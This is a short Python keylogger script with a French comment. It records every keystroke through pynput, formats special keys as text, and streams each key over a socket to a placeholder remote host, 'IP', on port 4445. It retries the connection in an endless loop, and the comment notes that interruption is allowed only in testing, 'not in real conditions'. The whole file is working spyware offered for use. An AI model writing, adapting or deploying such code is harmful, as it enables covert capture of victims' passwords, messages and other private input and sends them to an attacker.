import socket,time,sys,os
from pynput.keyboard import Listener
caps = 1
hote = "IP"
port = 4445

s=socket.socket()
def main():
    try:
        s.connect((hote, int(port))) 
        while 1:
            with Listener(on_press=log_keystroke ) as l:
                l.join()
#KeyBoardInterrupt seulement en test et non en condition reel
    except:
        s.close()
        time.sleep(60)
        main()

def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key== "Key.caps_lock":
        global caps
        caps = caps*-1
        key=""
    else:
        if key.startswith("Key"):
            key=key.split('.')
            key = "[{}]".format(key[1])
    if caps==-1:
        key=key.upper()
    s.send(key.encode())
        

while 1:
    main()


